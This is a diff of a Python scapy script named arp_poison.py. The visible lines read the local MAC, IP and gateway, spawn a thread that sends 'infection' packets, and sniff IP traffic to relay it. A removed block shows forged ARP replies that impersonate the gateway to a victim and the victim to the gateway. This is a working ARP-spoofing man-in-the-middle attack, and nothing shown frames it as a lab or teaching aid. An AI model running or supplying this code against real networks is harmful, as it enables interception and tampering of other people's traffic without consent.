@@ -1,3 +1,6 @@
+#sudo python arp_poison.py
+#2016.8.4
+
 import socket
 from scapy.all import *
 import os
@@ -25,8 +28,8 @@ def Ip_address(ifname):
 strs = subprocess.check_output(shlex.split('ip r l'))
 gateway = strs.split('default via')[-1].split()[0].split('/')[0]		# gateway ip(gateway)
 
-My_Macaddr = Mac_address('enp0s5')										# my Mac_address (My_Macaddr)
-My_ipaddr = Ip_address('enp0s5')										# my Ip_address (My_ipaddr)
+My_Macaddr = Mac_address('enp0s5')			# my Mac_address (My_Macaddr)
+My_ipaddr = Ip_address('enp0s5')			# my Ip_address (My_ipaddr)
 print "=====MAC, IP ,gateway====="
 print "MAC:"+My_Macaddr
 print "IP:"+My_ipaddr
@@ -65,10 +68,4 @@ def send_infection_packet(source,gateway_mac,My_Macaddr,gateway,psource):
 thread.start_new_thread(send_infection_packet,(source,gateway_mac,My_Macaddr,gateway,psource))
 sniff(filter='ip',prn=send_packet)
 
-'''while True:
-	third_packet = srp( Ether(dst=source)/ARP(op=2,hwsrc=My_Macaddr,psrc=gateway,hwdst=source ,pdst=psource ),timeout=1)		  # send to sender
-	fourth_packet = srp( Ether(dst=gateway_mac)/ARP(op=2,hwsrc=My_Macaddr,psrc=psource,hwdst=gateway_mac,pdst=gateway),timeout=1) # send to target
-	print "send packet!"
-	sniff(filter='ip',prn=send_packet,count=20)
-	time.sleep(1)'''
 
